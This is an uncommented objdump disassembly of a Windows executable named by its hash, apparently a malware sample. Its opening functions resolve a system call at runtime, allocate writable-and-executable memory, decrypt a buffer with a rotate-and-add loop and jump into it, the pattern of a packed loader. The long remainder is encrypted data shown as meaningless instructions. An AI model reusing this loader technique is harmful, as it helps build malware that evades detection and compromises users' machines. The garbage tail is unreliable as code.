
25f63b814e7dd8ca7148c5ba3ed72d0cd6d32616465778ccd9342b73d4e2bb21.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	sub    esp,0xf8
  411006:	push   esi
  411007:	mov    esi,DWORD PTR ds:0x42901c
  41100d:	push   edi
  41100e:	push   0x0
  411010:	push   0x80
  411015:	push   0x3
  411017:	push   0x0
  411019:	push   0x0
  41101b:	push   0x80000000
  411020:	push   0x429228
  411025:	call   esi
  411027:	mov    edi,eax
  411029:	cmp    edi,0xffffffff
  41102c:	mov    DWORD PTR [esp+0xc],edi
  411030:	je     0x41115f
  411036:	push   0x0
  411038:	push   0x80
  41103d:	push   0x4
  41103f:	push   0x0
  411041:	push   0x1
  411043:	push   0x4
  411045:	push   0x429220
  41104a:	call   esi
  41104c:	mov    esi,eax
  41104e:	cmp    esi,0xffffffff
  411051:	jne    0x411061
  411053:	pop    edi
  411054:	mov    eax,0x1
  411059:	pop    esi
  41105a:	add    esp,0xf8
  411060:	ret    
  411061:	push   ebx
  411062:	mov    ebx,DWORD PTR ds:0x429050
  411068:	push   ebp
  411069:	mov    ebp,DWORD PTR ds:0x429074
  41106f:	nop
  411070:	push   0x0
  411072:	lea    eax,[esp+0x14]
  411076:	push   eax
  411077:	push   0xc8
  41107c:	lea    ecx,[esp+0x4c]
  411080:	push   ecx
  411081:	push   edi
  411082:	call   DWORD PTR ds:0x429078
  411088:	test   eax,eax
  41108a:	je     0x4110d1
  41108c:	push   0x2
  41108e:	push   0x0
  411090:	push   0x0
  411092:	push   esi
  411093:	call   ebx
  411095:	mov    edx,DWORD PTR [esp+0x10]
  411099:	push   0x0
  41109b:	push   edx
  41109c:	push   0x0
  41109e:	mov    edi,eax
  4110a0:	push   edi
  4110a1:	push   esi
  4110a2:	call   ebp
  4110a4:	mov    ecx,DWORD PTR [esp+0x10]
  4110a8:	push   0x0
  4110aa:	lea    eax,[esp+0x1c]
  4110ae:	push   eax
  4110af:	push   ecx
  4110b0:	lea    edx,[esp+0x4c]
  4110b4:	push   edx
  4110b5:	push   esi
  4110b6:	call   DWORD PTR ds:0x429080
  4110bc:	mov    eax,DWORD PTR [esp+0x10]
  4110c0:	push   0x0
  4110c2:	push   eax
  4110c3:	push   0x0
  4110c5:	push   edi
  4110c6:	push   esi
  4110c7:	call   DWORD PTR ds:0x42907c
  4110cd:	mov    edi,DWORD PTR [esp+0x14]
  4110d1:	cmp    DWORD PTR [esp+0x10],0xc8
  4110d9:	je     0x411070
  4110db:	push   edi
  4110dc:	mov    edi,DWORD PTR ds:0x429084
  4110e2:	call   edi
  4110e4:	push   esi
  4110e5:	call   edi
  4110e7:	lea    ecx,[esp+0x1c]
  4110eb:	push   ecx
  4110ec:	call   DWORD PTR ds:0x42908c
  4110f2:	mov    ecx,DWORD PTR [esp+0x38]
  4110f6:	xor    edx,edx
  4110f8:	mov    eax,0x21c00
  4110fd:	div    ecx
  4110ff:	mov    edi,DWORD PTR ds:0x429154
  411105:	lea    edx,[esp+0x40]
  411109:	mov    ebx,ecx
  41110b:	mov    esi,eax
  41110d:	imul   esi,ecx
  411110:	push   esi
  411111:	push   0x4291e8
  411116:	push   edx
  411117:	call   edi
  411119:	xor    edx,edx
  41111b:	mov    eax,0x21c00
  411120:	div    ebx
  411122:	lea    eax,[esp+0x4c]
  411126:	add    edx,0x400
  41112c:	push   edx
  41112d:	push   0x4291c0
  411132:	push   eax
  411133:	call   edi
  411135:	push   0x22000
  41113a:	lea    ecx,[esp+0x5c]
  41113e:	push   0x429190
  411143:	push   ecx
  411144:	call   edi
  411146:	mov    edx,0x21c00
  41114b:	sub    edx,esi
  41114d:	push   edx
  41114e:	lea    eax,[esp+0x68]
  411152:	push   0x429168
  411157:	push   eax
  411158:	call   edi
  41115a:	add    esp,0x30
  41115d:	pop    ebp
  41115e:	pop    ebx
  41115f:	pop    edi
  411160:	xor    eax,eax
  411162:	pop    esi
  411163:	add    esp,0xf8
  411169:	ret    
  41116a:	nop
  41116b:	nop
  41116c:	nop
  41116d:	nop
  41116e:	nop
  41116f:	nop
  411170:	sub    esp,0x8
  411173:	push   ebx
  411174:	push   ebp
  411175:	mov    ebp,DWORD PTR [esp+0x20]
  411179:	push   esi
  41117a:	xor    eax,eax
  41117c:	push   edi
  41117d:	mov    edi,DWORD PTR [esp+0x1c]
  411181:	mov    DWORD PTR [esp+0x10],eax
  411185:	mov    esi,0xfffffffd
  41118a:	mov    DWORD PTR [esp+0x14],0x1
  411192:	mov    ecx,DWORD PTR [esp+0x20]
  411196:	mov    cl,BYTE PTR [ecx+esi*1+0x3]
  41119a:	add    esi,0x2
  41119d:	inc    esi
  41119e:	mov    BYTE PTR [esi+edi*1],cl
  4111a1:	movzx  ecx,BYTE PTR [eax+ebp*1]
  4111a5:	mov    edx,DWORD PTR [esp+0x10]
  4111a9:	mov    eax,DWORD PTR [esp+0x14]
  4111ad:	add    edx,eax
  4111af:	mov    DWORD PTR [esp+0x10],edx
  4111b3:	ror    eax,cl
  4111b5:	mov    eax,DWORD PTR [esp+0x10]
  4111b9:	mov    edx,eax
  4111bb:	shr    edx,0x3
  4111be:	mov    ebx,0x1
  4111c3:	sub    ebx,edx
  4111c5:	imul   eax,ebx
  4111c8:	mov    DWORD PTR [esp+0x10],eax
  4111cc:	shl    ebx,0x3
  4111cf:	mov    bl,BYTE PTR [esi+edi*1]
  4111d2:	add    bl,cl
  4111d4:	mov    ecx,DWORD PTR [esp+0x24]
  4111d8:	mov    BYTE PTR [esi+edi*1],bl
  4111db:	sub    esi,0x2
  4111de:	cmp    esi,ecx
  4111e0:	jl     0x411192
  4111e2:	pop    edi
  4111e3:	pop    esi
  4111e4:	pop    ebp
  4111e5:	pop    ebx
  4111e6:	add    esp,0x8
  4111e9:	ret    
  4111ea:	nop
  4111eb:	nop
  4111ec:	nop
  4111ed:	nop
  4111ee:	nop
  4111ef:	nop
  4111f0:	push   ebp
  4111f1:	mov    ebp,esp
  4111f3:	sub    esp,0x70
  4111f6:	mov    DWORD PTR [ebp-0x58],0x0
  4111fd:	mov    DWORD PTR [ebp-0x18],0x0
  411204:	mov    DWORD PTR [ebp-0x54],0x0
  41120b:	mov    DWORD PTR [ebp-0x4c],0x0
  411212:	mov    DWORD PTR [ebp-0x70],0x0
  411219:	mov    DWORD PTR [ebp-0x60],0x0
  411220:	mov    DWORD PTR [ebp-0x8],0x0
  411227:	mov    DWORD PTR [ebp-0x50],0x0
  41122e:	mov    DWORD PTR [ebp-0x48],0x0
  411235:	mov    DWORD PTR [ebp-0x6c],0x0
  41123c:	mov    DWORD PTR [ebp-0x30],0x0
  411243:	mov    DWORD PTR [ebp-0x4],0x0
  41124a:	mov    DWORD PTR [ebp-0x2c],0x0
  411251:	mov    DWORD PTR [ebp-0x14],0x0
  411258:	mov    DWORD PTR [ebp-0x10],0x0
  41125f:	mov    DWORD PTR [ebp-0x68],0x0
  411266:	mov    DWORD PTR [ebp-0x5c],0x0
  41126d:	mov    DWORD PTR [ebp-0xc],0x0
  411274:	mov    eax,ds:0x429254
  411279:	mov    DWORD PTR [ebp-0x28],eax
  41127c:	mov    ecx,DWORD PTR ds:0x429258
  411282:	mov    DWORD PTR [ebp-0x24],ecx
  411285:	mov    edx,DWORD PTR ds:0x42925c
  41128b:	mov    DWORD PTR [ebp-0x20],edx
  41128e:	mov    al,ds:0x429260
  411293:	mov    BYTE PTR [ebp-0x1c],al
  411296:	mov    ecx,DWORD PTR ds:0x429244
  41129c:	mov    DWORD PTR [ebp-0x40],ecx
  41129f:	mov    edx,DWORD PTR ds:0x429248
  4112a5:	mov    DWORD PTR [ebp-0x3c],edx
  4112a8:	mov    eax,ds:0x42924c
  4112ad:	mov    DWORD PTR [ebp-0x38],eax
  4112b0:	mov    cx,WORD PTR ds:0x429250
  4112b7:	mov    WORD PTR [ebp-0x34],cx
  4112bb:	mov    dl,BYTE PTR ds:0x429252
  4112c1:	mov    BYTE PTR [ebp-0x32],dl
  4112c4:	mov    DWORD PTR [ebp-0x30],0x40
  4112cb:	push   0xa
  4112cd:	call   DWORD PTR ds:0x429158
  4112d3:	lea    eax,[ebp-0x10]
  4112d6:	push   eax
  4112d7:	push   0x429230
  4112dc:	call   DWORD PTR ds:0x429004
  4112e2:	test   eax,eax
  4112e4:	je     0x41133c
  4112e6:	push   0x0
  4112e8:	push   0x0
  4112ea:	push   0x0
  4112ec:	call   DWORD PTR ds:0x429040
  4112f2:	mov    DWORD PTR [ebp-0x14],eax
  4112f5:	lea    ecx,[ebp-0x40]
  4112f8:	push   ecx
  4112f9:	lea    edx,[ebp-0x10]
  4112fc:	push   edx
  4112fd:	call   DWORD PTR ds:0x429000
  411303:	test   eax,eax
  411305:	je     0x41133c
  411307:	push   0x108a
  41130c:	push   0x3873f
  411311:	call   DWORD PTR ds:0x42903c
  411317:	mov    eax,DWORD PTR [ebp-0x10]
  41131a:	add    eax,0x1
  41131d:	mov    DWORD PTR [ebp-0x10],eax
  411320:	push   0x14
  411322:	push   0x0
  411324:	mov    ecx,DWORD PTR [ebp-0x14]
  411327:	push   ecx
  411328:	call   DWORD PTR ds:0x429038
  41132e:	push   0x0
  411330:	push   0x0
  411332:	mov    edx,DWORD PTR [ebp-0x14]
  411335:	push   edx
  411336:	call   DWORD PTR ds:0x429034
  41133c:	mov    BYTE PTR [ebp-0x40],0x56
  411340:	call   DWORD PTR ds:0x429030
  411346:	mov    DWORD PTR [ebp-0x2c],eax
  411349:	mov    BYTE PTR [ebp-0x3e],0x72
  41134d:	movzx  eax,WORD PTR [ebp-0x2c]
  411351:	cmp    eax,0x539
  411356:	jne    0x4113a4
  411358:	mov    BYTE PTR [ebp-0x34],0x0
  41135c:	mov    DWORD PTR [ebp-0x14],0xe0d
  411363:	lea    ecx,[ebp-0x28]
  411366:	push   ecx
  411367:	call   DWORD PTR ds:0x42902c
  41136d:	mov    DWORD PTR [ebp-0x60],eax
  411370:	mov    DWORD PTR [ebp-0x54],0x3a
  411377:	lea    edx,[ebp-0x40]
  41137a:	push   edx
  41137b:	mov    eax,DWORD PTR [ebp-0x60]
  41137e:	push   eax
  41137f:	call   DWORD PTR ds:0x429028
  411385:	mov    DWORD PTR [ebp-0x44],eax
  411388:	mov    DWORD PTR [ebp-0x8],0x2bef1e17
  41138f:	push   0x0
  411391:	mov    ecx,DWORD PTR [ebp-0x70]
  411394:	push   ecx
  411395:	call   DWORD PTR ds:0x429014
  41139b:	mov    DWORD PTR [ebp-0x6c],0x110e87
  4113a2:	jmp    0x4113c5
  4113a4:	mov    BYTE PTR ds:0x448090,0x0
  4113ab:	mov    BYTE PTR ds:0x42e210,0x0
  4113b2:	push   0x0
  4113b4:	mov    edx,DWORD PTR [ebp-0x70]
  4113b7:	push   edx
  4113b8:	call   DWORD PTR ds:0x42914c
  4113be:	mov    BYTE PTR ds:0x446060,0x0
  4113c5:	push   DWORD PTR ds:0x42902c
  4113cb:	pop    edx
  4113cc:	mov    DWORD PTR [ebp-0x68],edx
  4113cf:	push   DWORD PTR [ebp-0x30]
  4113d2:	push   0x1000
  4113d7:	mov    eax,DWORD PTR [ebp-0x14]
  4113da:	add    eax,0x23
  4113dd:	add    eax,0x23
  4113e0:	push   eax
  4113e1:	xor    eax,eax
  4113e3:	push   eax
  4113e4:	mov    ecx,DWORD PTR [ebp-0x44]
  4113e7:	call   ecx
  4113e9:	push   eax
  4113ea:	pop    ecx
  4113eb:	mov    DWORD PTR [ebp-0x4],ecx
  4113ee:	mov    eax,DWORD PTR [ebp-0x6c]
  4113f1:	sub    eax,0xdae0b
  4113f6:	mov    DWORD PTR [ebp-0x6c],eax
  4113f9:	cmp    DWORD PTR [ebp-0x4],0x0
  4113fd:	jne    0x41140e
  4113ff:	push   0x0
  411401:	call   DWORD PTR ds:0x42900c
  411407:	mov    BYTE PTR ds:0x446060,0x0
  41140e:	mov    ecx,DWORD PTR [ebp-0x4]
  411411:	add    ecx,DWORD PTR [ebp-0x14]
  411414:	mov    edx,DWORD PTR [ebp-0x8]
  411417:	mov    DWORD PTR [ecx],edx
  411419:	mov    DWORD PTR [ebp-0x2c],0x410000
  411420:	mov    eax,DWORD PTR [ebp-0x60]
  411423:	push   eax
  411424:	call   DWORD PTR ds:0x429024
  41142a:	mov    ecx,DWORD PTR [ebp-0x4]
  41142d:	add    ecx,DWORD PTR [ebp-0x54]
  411430:	mov    DWORD PTR [ebp-0x5c],ecx
  411433:	mov    edx,DWORD PTR ds:0x429028
  411439:	mov    DWORD PTR [ebp-0x4c],edx
  41143c:	mov    eax,DWORD PTR [ebp-0x4]
  41143f:	add    eax,DWORD PTR [ebp-0x14]
  411442:	mov    ecx,DWORD PTR [ebp+0x8]
  411445:	mov    DWORD PTR [eax+0x4],ecx
  411448:	mov    edx,DWORD PTR [ebp-0x4]
  41144b:	add    edx,DWORD PTR [ebp-0x14]
  41144e:	mov    DWORD PTR [ebp-0xc],edx
  411451:	mov    eax,DWORD PTR [ebp-0x70]
  411454:	push   eax
  411455:	call   DWORD PTR ds:0x429150
  41145b:	cmp    DWORD PTR [ebp-0x6c],0x0
  41145f:	jbe    0x41147c
  411461:	mov    ecx,DWORD PTR [ebp-0xc]
  411464:	push   ecx
  411465:	mov    edx,DWORD PTR [ebp-0x14]
  411468:	push   edx
  411469:	mov    eax,DWORD PTR [ebp-0x2c]
  41146c:	add    eax,DWORD PTR [ebp-0x6c]
  41146f:	push   eax
  411470:	mov    ecx,DWORD PTR [ebp-0x4]
  411473:	push   ecx
  411474:	call   0x411170
  411479:	add    esp,0x10
  41147c:	call   DWORD PTR ds:0x429020
  411482:	cmp    DWORD PTR [ebp-0x5c],0x0
  411486:	je     0x411499
  411488:	push   DWORD PTR [ebp-0x4c]
  41148b:	push   DWORD PTR [ebp-0x68]
  41148e:	mov    edx,DWORD PTR [ebp-0x5c]
  411491:	push   eax
  411492:	jmp    edx
  411494:	jmp    0x422f7a
  411499:	mov    edx,DWORD PTR [ebp+0x8]
  41149c:	mov    DWORD PTR [ebp-0x18],edx
  41149f:	push   0x1
  4114a1:	mov    eax,DWORD PTR [ebp-0x70]
  4114a4:	push   eax
  4114a5:	call   DWORD PTR ds:0x429010
  4114ab:	cmp    bl,BYTE PTR [ebx]
  4114ad:	pop    es
  4114ae:	push   esp
  4114af:	pop    esi
  4114b0:	sub    DWORD PTR [edi],esp
  4114b2:	(bad)  
  4114b3:	jmp    0xd3bd:0xa5c1740b
  4114ba:	push   cs
  4114bb:	scas   eax,DWORD PTR es:[edi]
  4114bc:	rcpps  xmm3,xmm7
  4114bf:	dec    ebp
  4114c0:	rol    BYTE PTR [ecx],0x94
  4114c3:	retf   0x2620
  4114c6:	xchg   ebp,eax
  4114c7:	aam    0x20
  4114c9:	not    DWORD PTR [edx-0x5b47723e]
  4114cf:	adc    BYTE PTR [ebx-0x21],bl
  4114d2:	stc    
  4114d3:	in     al,0xfd
  4114d5:	xor    ebx,0xffffffc5
  4114d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114d9:	mov    al,bh
  4114db:	aam    0x39
  4114dd:	test   eax,0xb6b90d85
  4114e2:	int3   
  4114e3:	icebp  
  4114e4:	xor    edi,DWORD PTR [eax+edi*1+0x66]
  4114e8:	xor    eax,0x500370f
  4114ed:	jns    0x4114d6
  4114ef:	hlt    
  4114f0:	add    ah,dl
  4114f2:	jecxz  0x41152e
  4114f4:	cmp    BYTE PTR [edi],dh
  4114f6:	sbb    edx,ebx
  4114f8:	cli    
  4114f9:	xchg   ecx,eax
  4114fa:	adc    DWORD PTR [edx+edx*1-0x758d2502],esi
  411501:	jb     0x4114fb
  411503:	xchg   ebp,eax
  411504:	aaa    
  411505:	sub    al,0x26
  411507:	shr    DWORD PTR [edi+0x4f],1
  41150a:	mov    cl,0xac
  41150c:	imul   ebx,DWORD PTR [edx-0x76ec25c8],0x7a
  411513:	stos   BYTE PTR es:[edi],al
  411514:	dec    esp
  411515:	pop    edi
  411516:	sbb    BYTE PTR [ebp*8-0x20df32ef],bh
  41151d:	xchg   edx,eax
  41151e:	xor    al,0x11
  411520:	nop
  411521:	jbe    0x4114c5
  411523:	mov    edx,0xd1ec7a7e
  411528:	test   BYTE PTR [esi],ch
  41152a:	pop    eax
  41152b:	rcr    BYTE PTR [edx-0x4b],1
  41152e:	mov    ebp,0xb1f1fbb3
  411533:	shl    DWORD PTR [ebp-0x1d3a0460],1
  411539:	xchg   ebp,eax
  41153a:	popa   
  41153b:	in     al,dx
  41153c:	pop    ss
  41153d:	add    edx,esp
  41153f:	and    edi,ecx
  411541:	(bad)  
  411543:	popf   
  411544:	gs push cs
  411546:	cmp    eax,0xe511d5c2
  41154b:	fsub   st,st(1)
  41154d:	test   BYTE PTR [ebx+0x20],0x1a
  411551:	outs   dx,BYTE PTR ds:[esi]
  411552:	fadd   st,st(4)
  411554:	scas   eax,DWORD PTR es:[edi]
  411555:	cmp    ch,BYTE PTR [esi+edi*4+0x6392c482]
  41155c:	iret   
  41155d:	jmp    0x4115a8
  41155f:	or     BYTE PTR [edx+0x1c],0xde
  411563:	std    
  411564:	cmp    BYTE PTR [edx],ah
  411566:	pop    eax
  411567:	test   eax,0x60a70494
  41156c:	mov    ah,0xa7
  41156e:	popa   
  41156f:	push   edx
  411570:	aas    
  411571:	aad    0xa9
  411573:	std    
  411574:	les    edi,FWORD PTR [ecx+ebp*2+0x7]
  411578:	icebp  
  411579:	add    eax,0xd76c4b76
  41157e:	cdq    
  41157f:	gs xchg esi,eax
  411581:	jp     0x411541
  411583:	call   0x9ff7:0x3f52431d
  41158a:	(bad)  
  41158b:	mov    ah,0x19
  41158d:	push   0x74b86662
  411592:	mov    edx,0x18f91fb1
  411597:	pop    edx
  411598:	(bad)  
  411599:	(bad)  
  41159a:	sahf   
  41159b:	mov    eax,ds:0x6de6b459
  4115a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115a1:	xor    al,0xd6
  4115a3:	ret    0xb427
  4115a6:	xchg   BYTE PTR cs:[edi+0x4a],bh
  4115aa:	cmp    al,0xbd
  4115ac:	mov    ah,0xd9
  4115ae:	fcom   DWORD PTR [esi]
  4115b0:	mov    ds:0x44f6f289,eax
  4115b5:	test   ecx,edx
  4115b7:	pop    ebp
  4115b9:	sbb    eax,0xaf9e3d11
  4115be:	stc    
  4115bf:	mov    DWORD PTR [ecx],esp
  4115c1:	sbb    bl,BYTE PTR [ebp-0x7a]
  4115c4:	mov    cl,0xd1
  4115c6:	repnz push eax
  4115c8:	xor    eax,0x1ee85f5a
  4115cd:	sbb    edi,DWORD PTR [eax]
  4115cf:	xor    esp,eax
  4115d1:	push   es
  4115d2:	sub    al,0xf4
  4115d4:	imul   eax,DWORD PTR [ebp-0x6a3b51c0],0x394aa40e
  4115de:	retf   
  4115df:	jae    0x41158a
  4115e1:	push   esi
  4115e2:	jnp    0x4115b6
  4115e4:	add    BYTE PTR [ecx-0x1d46b309],cl
  4115ea:	dec    edi
  4115eb:	xor    al,0xd1
  4115ed:	lds    esi,FWORD PTR [edi+ebp*4-0x5c]
  4115f1:	cld    
  4115f2:	inc    edx
  4115f3:	or     ebp,ebx
  4115f5:	ret    
  4115f6:	mov    ebp,ebx
  4115f8:	aam    0x39
  4115fa:	sbb    edi,esi
  4115fc:	push   es
  4115fd:	stos   BYTE PTR es:[edi],al
  4115fe:	outs   dx,BYTE PTR ds:[esi]
  4115ff:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  411601:	fmul   QWORD PTR [esp+ebp*4-0x45]
  411605:	mov    esi,0x25f877e2
  41160a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41160b:	nop
  41160c:	jae    0x4115f7
  41160e:	or     DWORD PTR [eax+0x23],0x1a
  411612:	jecxz  0x411604
  411614:	jbe    0x411692
  411616:	mov    al,ds:0xdbf9991d
  41161b:	fdiv   DWORD PTR [esi]
  41161d:	pop    ebp
  41161e:	test   BYTE PTR [eax+ebx*8+0x49dbc99e],0xdd
  411626:	jmp    0xa9d7c201
  41162b:	mov    ebp,0xc7b30edb
  411630:	ss sub dl,bh
  411633:	jg     0x411655
  411635:	add    cl,BYTE PTR [ecx]
  411637:	push   0x8e47b6e5
  41163c:	cmp    al,0xdb
  41163e:	popa   
  41163f:	mov    cl,0x49
  411641:	dec    ebp
  411642:	call   0xaa79:0xc5d0c39a
  411649:	pop    ecx
  41164a:	fistp  QWORD PTR [ecx-0x1f]
  41164d:	sub    esi,DWORD PTR [ecx+0x3b]
  411650:	jo     0x411653
  411652:	retf   0x55aa
  411655:	pop    ss
  411656:	fs push cs
  411658:	hlt    
  411659:	retf   0xcb6e
  41165c:	cmp    BYTE PTR ds:0xf9221f1e,bh
  411662:	dec    esp
  411663:	sub    edi,eax
  411665:	xchg   edx,eax
  411666:	pusha  
  411667:	sar    eax,1
  411669:	clc    
  41166a:	push   ss
  41166b:	xchg   bh,cl
  41166d:	neg    DWORD PTR [eax-0x86991d0]
  411673:	inc    di
  411675:	sub    eax,0x22a67843
  41167a:	xlat   BYTE PTR ds:[ebx]
  41167b:	lods   eax,DWORD PTR ds:[esi]
  41167c:	inc    eax
  41167d:	in     al,0x71
  41167f:	jmp    0xbc9d3506
  411684:	(bad)  
  411685:	cmp    eax,0x63001935
  41168a:	add    cl,0xaf
  41168d:	push   ecx
  41168e:	and    ch,BYTE PTR [eax+ecx*1+0x7edc3e7c]
  411695:	mov    DWORD PTR [ecx],esp
  411697:	cmp    ah,BYTE PTR [edi+0x72ddad2b]
  41169d:	scas   eax,DWORD PTR es:[edi]
  41169e:	fs add al,0x74
  4116a1:	ror    DWORD PTR [edx],1
  4116a3:	stos   BYTE PTR es:[edi],al
  4116a4:	ja     0x41169c
  4116a6:	out    dx,al
  4116a7:	mov    eax,0x40a286c8
  4116ac:	call   0xbcc4:0xd0de599f
  4116b3:	mov    bh,0xa
  4116b5:	inc    edi
  4116b6:	push   es
  4116b7:	stos   DWORD PTR es:[edi],eax
  4116b8:	sub    eax,0x153028b9
  4116bd:	and    BYTE PTR [ecx],ch
  4116bf:	inc    esi
  4116c0:	test   esi,eax
  4116c2:	test   BYTE PTR [ebx-0x53],bh
  4116c5:	jle    0x4116ed
  4116c7:	addr16 das 
  4116c9:	data16 into 
  4116cb:	push   0x5
  4116cd:	stos   BYTE PTR es:[edi],al
  4116ce:	sar    DWORD PTR gs:[ebp+edi*8-0x28],0xc5
  4116d4:	mov    ds:0x291e901f,eax
  4116d9:	in     eax,dx
  4116da:	xor    al,bl
  4116dc:	pushf  
  4116dd:	icebp  
  4116de:	sbb    esp,edi
  4116e0:	test   eax,0xeaff47aa
  4116e5:	loop   0x411707
  4116e7:	mov    fs:0x4ebaf8d4,eax
  4116ed:	push   cs
  4116ee:	push   ss
  4116ef:	sub    dl,BYTE PTR [edx+0x19]
  4116f2:	dec    edx
  4116f3:	push   ss
  4116f4:	mov    edi,0x713023e2
  4116f9:	mov    esi,0xb27283a1
  4116fe:	or     al,0xc1
  411700:	push   0x42e0a848
  411705:	or     al,0x58
  411707:	aam    0x46
  411709:	dec    edi
  41170a:	mov    ds:0x896868aa,al
  41170f:	fistp  DWORD PTR [eax-0x6a]
  411712:	imul   eax,DWORD PTR [edi+0xc832725],0x8eb54c26
  41171c:	int    0x9a
  41171e:	inc    ecx
  41171f:	mov    ch,0xa2
  411721:	call   0xd457c950
  411726:	pop    esi
  411727:	fidiv  WORD PTR ds:0x2ff24842
  41172d:	(bad)  
  41172e:	cld    
  41172f:	pop    eax
  411730:	shl    BYTE PTR [ebx+0x51e268f7],1
  411736:	jnp    0x411797
  411738:	(bad)  
  411739:	fbstp  TBYTE PTR [eax+0x59]
  41173c:	stos   DWORD PTR es:[edi],eax
  41173d:	xor    dh,al
  41173f:	out    0xf5,al
  411741:	sub    ebp,DWORD PTR [esi+0x65]
  411744:	mov    DWORD PTR [eax-0x693401f9],ebx
  41174a:	push   eax
  41174b:	mov    dl,0x5d
  41174d:	aas    
  41174e:	pop    esp
  41174f:	pop    esi
  411750:	call   0xc9e79d96
  411755:	adc    BYTE PTR [ecx-0x15],ch
  411758:	aaa    
  411759:	push   ds
  41175a:	in     al,0xa
  41175c:	mov    ebp,0xcc3a2de0
  411761:	and    al,0x29
  411763:	push   eax
  411764:	shr    BYTE PTR [edx+0x13274f7e],0x59
  41176b:	loopne 0x411792
  41176d:	pop    ebp
  41176e:	cwde   
  41176f:	xchg   ebx,eax
  411770:	lea    eax,[eax-0x17]
  411773:	jmp    0x6ff:0x1dafecbb
  41177a:	cdq    
  41177b:	out    0x9,eax
  41177d:	int    0xf7
  41177f:	sub    BYTE PTR [eax],bl
  411781:	loopne 0x411728
  411783:	fidiv  WORD PTR [edi-0x60a1b09f]
  411789:	cmp    DWORD PTR [esi+0x22378bee],eax
  41178f:	loop   0x41178c
  411791:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  411793:	pushf  
  411794:	sar    bl,0xc4
  411797:	aam    0xed
  411799:	je     0x4117f8
  41179b:	rcl    cl,0x83
  41179e:	jl     0x41172d
  4117a0:	pop    edi
  4117a1:	jbe    0x4117b2
  4117a3:	add    ebx,ebx
  4117a5:	je     0x411733
  4117a7:	adc    BYTE PTR [esi],cl
  4117a9:	mov    dh,BYTE PTR [edi+ecx*1-0x17]
  4117ad:	icebp  
  4117ae:	sbb    ecx,DWORD PTR [esi]
  4117b0:	jae    0x411770
  4117b2:	hlt    
  4117b3:	xchg   ecx,eax
  4117b4:	push   ss
  4117b5:	popa   
  4117b6:	cdq    
  4117b7:	into   
  4117b8:	mov    al,gs:0x809617b8
  4117be:	xchg   esi,eax
  4117bf:	imul   ecx,DWORD PTR [esi],0x2a258d11
  4117c5:	inc    ebp
  4117c6:	dec    esi
  4117c7:	adc    esi,DWORD PTR [edx]
  4117c9:	call   0x3b78:0x51f452f
  4117d0:	adc    BYTE PTR [edx],cl
  4117d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117d3:	xchg   edx,eax
  4117d4:	dec    edi
  4117d5:	jbe    0x4117aa
  4117d7:	sahf   
  4117d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117d9:	inc    edx
  4117da:	sar    ebx,0xf8
  4117dd:	pop    edi
  4117de:	push   0xc65ef4c5
  4117e3:	out    0xe5,al
  4117e5:	into   
  4117e6:	nop
  4117e7:	mov    bl,0x6a
  4117e9:	sub    eax,0xb6e1e849
  4117ee:	mov    eax,0x355cff18
  4117f3:	jecxz  0x4117e9
  4117f5:	or     eax,0xf730e6df
  4117fa:	adc    DWORD PTR [edx+0x46],edi
  4117fd:	and    BYTE PTR [ebx],bl
  4117ff:	int3   
  411800:	in     al,0x2b
  411802:	push   es
  411803:	and    ebx,DWORD PTR [ecx-0x561b43dc]
  411809:	mov    ch,0x78
  41180b:	mov    ds:0xa55a51fe,eax
  411810:	cmp    edx,esi
  411812:	sbb    al,bl
  411814:	fwait
  411815:	mov    bh,0xb9
  411817:	pop    eax
  411818:	int3   
  411819:	rep ins BYTE PTR es:[edi],dx
  41181b:	test   al,0xc7
  41181d:	xlat   BYTE PTR ds:[ebx]
  41181e:	sub    al,0x73
  411820:	cdq    
  411821:	push   eax
  411822:	test   al,0x74
  411824:	scas   eax,DWORD PTR es:[edi]
  411825:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  411827:	mov    edi,ebx
  411829:	push   ss
  41182a:	mov    esp,0x47c07097
  41182f:	jnp    0x4117b3
  411831:	(bad)  [ebp-0x522c2199]
  411837:	pusha  
  411838:	push   edx
  411839:	bound  eax,QWORD PTR [ecx]
  41183b:	nop
  41183c:	(bad)  
  41183d:	in     al,0xc8
  41183f:	addr16 jmp 0x81df6fe0
  411845:	js     0x41188d
  411847:	lock sahf 
  411849:	cmp    eax,0x8b68262e
  41184e:	inc    edx
  41184f:	stos   BYTE PTR es:[edi],al
  411850:	add    edi,DWORD PTR [ecx+0xa1e8cc4]
  411856:	outs   dx,DWORD PTR ds:[esi]
  411857:	pop    esp
  411858:	iret   
  411859:	push   edx
  41185a:	jmp    0x4118a4
  41185c:	retf   
  41185d:	push   ebp
  41185e:	cwde   
  41185f:	inc    ebp
  411861:	fisubr DWORD PTR [ebx]
  411863:	fst    QWORD PTR [ecx+edx*2-0x4b402112]
  41186a:	vsqrtsd xmm1,xmm1,QWORD PTR [edx-0x5c]
  41186f:	cld    
  411870:	inc    edx
  411871:	outs   dx,BYTE PTR ds:[esi]
  411872:	outs   dx,BYTE PTR ds:[esi]
  411873:	xlat   BYTE PTR ds:[ebx]
  411874:	sbb    al,0x8a
  411876:	dec    eax
  411877:	aam    0xc5
  411879:	jge    0x4118d3
  41187b:	sbb    al,0xb0
  41187d:	stos   BYTE PTR es:[edi],al
  41187e:	pop    es
  41187f:	pop    es
  411880:	stos   DWORD PTR es:[edi],eax
  411881:	scas   al,BYTE PTR es:[edi]
  411882:	sbb    esp,ebx
  411884:	inc    ecx
  411885:	or     BYTE PTR [ebp+0x5bdd383e],dl
  41188b:	loop   0x41183b
  41188d:	push   esp
  41188e:	push   edi
  41188f:	jbe    0x4118cc
  411891:	scas   al,BYTE PTR es:[edi]
  411892:	mov    cl,0xc8
  411894:	or     ch,BYTE PTR [edx-0x5b]
  411897:	ins    BYTE PTR es:[edi],dx
  411898:	in     eax,0xdc
  41189a:	aas    
  41189b:	arpl   WORD PTR [ecx],bx
  41189d:	and    eax,0xe54731eb
  4118a2:	add    al,bl
  4118a4:	test   DWORD PTR [edi],edx
  4118a6:	ja     0x41186e
  4118a8:	xor    eax,0x77a45f2d
  4118ad:	fsub   DWORD PTR [edx-0x44]
  4118b0:	mov    bh,0xba
  4118b2:	pop    esp
